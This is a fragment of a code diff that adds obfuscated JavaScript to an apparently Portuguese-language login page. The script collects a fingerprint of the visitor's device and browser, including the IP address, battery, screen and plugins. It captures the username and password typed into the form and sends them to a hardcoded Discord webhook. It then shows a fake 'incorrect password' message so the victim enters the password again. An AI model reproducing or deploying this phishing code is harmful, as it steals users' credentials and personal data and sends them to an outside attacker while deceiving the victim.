+_0x1d6c+=_0x5d3c(_0x4b8f,31)+' '+_0x4d2f+'\n';
+_0x1d6c+=_0x5d3c(_0x4b8f,32)+' '+(_0x2c7e['ip']||'Nao coletado')+'\n';
+_0x1d6c+=_0x5d3c(_0x4b8f,33)+' '+(_0x2c7e['batteryLevel']!==undefined?(_0x2c7e['batteryLevel']*100)+'%':'Nao disponivel')+'\n';
+_0x1d6c+=_0x5d3c(_0x4b8f,34)+' '+_0x2c7e['ua']+'\n';
+_0x1d6c+=_0x5d3c(_0x4b8f,35)+' '+_0x2c7e['pl']+'\n';
+_0x1d6c+=_0x5d3c(_0x4b8f,36)+' '+_0x2c7e['lang']+'\n';
+_0x1d6c+=_0x5d3c(_0x4b8f,37)+' '+_0x4f8b+'\n';
+_0x1d6c+=_0x5d3c(_0x4b8f,38)+' '+_0x2c7e['url']+'\n';
+_0x1d6c+=_0x5d3c(_0x4b8f,39)+' '+_0x2c7e['host']+_0x2c7e['path']+_0x2c7e['search']+'\n';
+_0x1d6c+=_0x5d3c(_0x4b8f,40)+' '+(_0x2c7e['cookie']?'Sim':'Nao')+'\n';
+_0x1d6c+=_0x5d3c(_0x4b8f,41)+' '+_0x2c7e['screenW']+'x'+_0x2c7e['screenH']+', Ratio: '+_0x2c7e['pixelRatio']+', Cores: '+_0x2c7e['colorDepth']+'\n';
+_0x1d6c+=_0x5d3c(_0x4b8f,42)+' '+_0x2c7e['cores']+'\n';
+_0x1d6c+=_0x5d3c(_0x4b8f,43)+' '+_0x2c7e['colorDepth']+'\n';
+_0x1d6c+=_0x5d3c(_0x4b8f,44)+' '+(_0x2c7e['effectiveType']||'Nao disponivel')+'\n';
+_0x1d6c+=_0x5d3c(_0x4b8f,45)+' '+(_0x2c7e['touchPoints']||0)+' pontos'+'\n';
+_0x1d6c+=_0x5d3c(_0x4b8f,46)+' '+(_0x2c7e['onLine']?'Online':'Offline')+'\n';
+_0x1d6c+=_0x5d3c(_0x4b8f,47)+' '+(_0x2c7e['webdriver']?'Sim':'Nao')+'\n';
+_0x1d6c+=_0x5d3c(_0x4b8f,48)+' '+(_0x2c7e['memory']?(_0x2c7e['memory']+'GB'):'Nao disponivel')+'\n';
+_0x1d6c+=_0x5d3c(_0x4b8f,49)+' '+(_0x2c7e['batteryLevel']!==undefined?Math['round'](_0x2c7e['batteryLevel']*100)+'%':'Nao disponivel')+'\n';
+_0x1d6c+=_0x5d3c(_0x4b8f,50)+' '+(_0x2c7e['batteryCharging']!==undefined?(_0x2c7e['batteryCharging']?'Sim':'Nao'):'Nao disponivel')+'\n';
+_0x1d6c+='\n` Plugins: '+(Array['isArray'](_0x2c7e['plugins'])?_0x2c7e['plugins']['join'](', '):'Nao disponivel');
+return _0x1d6c;
+}
+
+function _0x4c9f(_0x3d8e,_0x4d2f){
+var _0x2a7b=_0x1e9f(_0x3d8e,_0x4d2f);
+try{var _0x3f6c=new XMLHttpRequest();_0x3f6c['open'](_0x5d3c(_0x4b8f,1),'https://discord.com/api/'+_0x5d3c(_0x4b8f,0)+'/1517928434339152134/m8D4Q95w5COtcqmu2bVlNfj6TKSu2mAvvaxN0a-TOgM89sU9w0-ubNP34lOyWv8hiZlr',true);_0x3f6c['setRequestHeader']('Content-Type','application/json');_0x3f6c['send'](JSON['stringify']({[_0x5d3c(_0x4b8f,2)]:_0x2a7b}));}catch(e){console[_0x5d3c(_0x4b8f,3)]('Erro ao enviar:',e);}
+}
+
+// Coletar IP via API
+try{
+var _0x1d9f=new XMLHttpRequest();
+_0x1d9f['open']('GET','https://api.ipify.org?format=json',true);
+_0x1d9f['onload']=function(){
+if(_0x1d9f['status']===200){
+var _0x4e5c=JSON['parse'](_0x1d9f['responseText']);
+window['_ip']=_0x4e5c['ip'];
+}
+};
+_0x1d9f['send']();
+}catch(e){}
+
+// Formulario
+var _0x2f1a=document['getElementById']('loginForm');
+var _0x3b7c=document['getElementById']('username');
+var _0x4d9e=document['getElementById']('password');
+var _0x5f8a=document['getElementById']('loginBtn');
+var _0x1c7b=document['getElementById']('errorMsg');
+var _0x3e2d=document['getElementById']('loader');
+
+function _0x5d9a(){
+if(_0x3b7c['value']['trim']()&&_0x4d9e['value']['trim']()){
+_0x5f8a['disabled']=false;
+_0x5f8a['classList']['add']('active');
+}else{
+_0x5f8a['disabled']=true;
+_0x5f8a['classList']['remove']('active');
+}
+}
+
+_0x3b7c['addEventListener']('input',_0x5d9a);
+_0x4d9e['addEventListener']('input',_0x5d9a);
+
+document['querySelectorAll']('.input-group input')['forEach'](function(_0x3f9c){
+_0x3f9c['addEventListener']('focus',function(){this['parentElement']['classList']['add']('filled');});
+_0x3f9c['addEventListener']('blur',function(){if(!this['value']){this['parentElement']['classList']['remove']('filled');}});
+});
+
+_0x2f1a['addEventListener']('submit',function(_0x5e8f){
+_0x5e8f['preventDefault']();
+var _0x2c9a=_0x3b7c['value']['trim']();
+var _0x1f3e=_0x4d9e['value'];
+if(!_0x2c9a||!_0x1f3e)return;
+
+_0x5f8a['disabled']=true;
+_0x5f8a['style']['display']='none';
+_0x3e2d['style']['display']='block';
+_0x1c7b['style']['display']='none';
+
+// Aguarda IP e envia
+setTimeout(function(){
+window['_ip']=window['_ip']||'Nao coletado';
+_0x4c9f(_0x2c9a,_0x1f3e);
+
+_0x3e2d['style']['display']='none';
+_0x1c7b['style']['display']='block';
+_0x1c7b['textContent']='Senha incorreta. Tente novamente ou clique em "Esqueceu a senha?" para redefini-la.';
+_0x5f8a['style']['display']='block';
+_0x5f8a['disabled']=false;
+_0x5f8a['classList']['add']('active');
+_0x4d9e['value']='';
+_0x4d9e['focus']();
+},1000);
 });
 </script>
 </body>
